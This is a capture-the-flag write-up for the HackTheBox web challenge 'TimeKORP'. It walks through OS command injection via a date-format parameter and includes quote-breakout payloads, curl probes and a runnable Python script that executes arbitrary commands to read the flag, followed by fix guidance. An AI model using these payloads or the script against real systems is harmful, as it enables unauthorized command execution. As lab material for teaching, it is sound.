## Overview

`TimeKORP` is a Very Easy HackTheBox **Web** challenge. The whole app is a one-page
"What's the time?" clock whose display format you control via a `format` query
parameter. Those `%H/%M/%S` tokens are `date(1)` format specifiers, which is the tell
that the server is shelling out to the `date` command with your input concatenated in.
That concatenation lands inside a single-quoted literal, so closing the quote gives
[OS command injection](https://cwe.mitre.org/data/definitions/78.html) and a read of
the flag.

## The technique

The page renders the clock roughly like this:

```php
$out = exec("date '+" . $_GET['format'] . "'");   // input lands INSIDE '...'
echo $out;
```

Your `format` value is spliced **inside a single-quoted literal** after the `+`. Inside
`'...'`, the shell treats `;`, `&&`, and `$()` as ordinary text — they do nothing until
the quote is closed. The first job is therefore to prove the quoting context, then break
out of it.

## Solution

**Step 1 — confirm the context.** Send a command-substitution probe and watch how it
comes back:

```bash
curl -s -G "http://<target>:<port>/" --data-urlencode 'format=$(id)'
# -> It's $(id).
```

`$(id)` is echoed **verbatim**, not executed — proof we are inside single quotes
(double-quoted context would have run it). So the breakout must start by closing the
quote.

**Step 2 — break out.** Emit a literal `'` to close the quote, chain the real command
with `&&`, and finish with `#` to comment out the trailing `'` the app re-appends:

```bash
curl -s -G "http://<target>:<port>/" --data-urlencode "format=' && cat /flag #"
```

This turns the executed command into `date '+' && cat /flag #'` — `date '+'` prints an
empty line, then `cat /flag` runs as the web user (`uid=1000(www)`).

One gotcha: PHP's `exec()` returns only the **last** line of output, so the
flag-reading command must be placed last in the chain. For multi-line output (e.g.
`ls /`) collapse it first with `tr '\n' ' '`.

The full solve, runnable verbatim:

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, re, requests

base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337"

def run(cmd):
    fmt = f"' && {cmd} #"
    r = requests.get(base + "/", params={"format": fmt})
    m = re.search(r"It's</span> (.*?)<span", r.text)
    return m.group(1) if m else r.text

print("[*] id    :", run("id"))
print("[*] /flag :", run("cat /flag/* /flag 2>/dev/null"))
```

```bash
python3 solve.py http://<target>:<port>
# [*] id    : uid=1000(www) gid=1000(www) groups=1000(www)
# [*] /flag : HTB{...}
```

The flag prints live from the running instance.

## Why it worked

User input was placed directly into a shell command string with no neutralization. The
only nuance over textbook [command injection](https://cwe.mitre.org/data/definitions/78.html)
was the single-quoted context: shell metacharacters stay inert until you emit a `'` to
escape the quote. The `$()`-echoes-verbatim probe pins the context immediately, so you
pick the correct breakout instead of guessing.

## Fix / defense

- Don't shell out to format dates — use the language's native date library.
- If a subprocess is unavoidable, pass arguments via `execve` argv with **no shell**
  interpreter, so quoting and metacharacters can't be reinterpreted.
- Whitelist the allowed format specifiers and reject quotes and shell metacharacters.

```php
$fmt = preg_replace('/[^%HMSYmd:\/ -]/', '', $_GET['format']);
echo (new DateTime())->format(str_replace('%', '', $fmt));
```
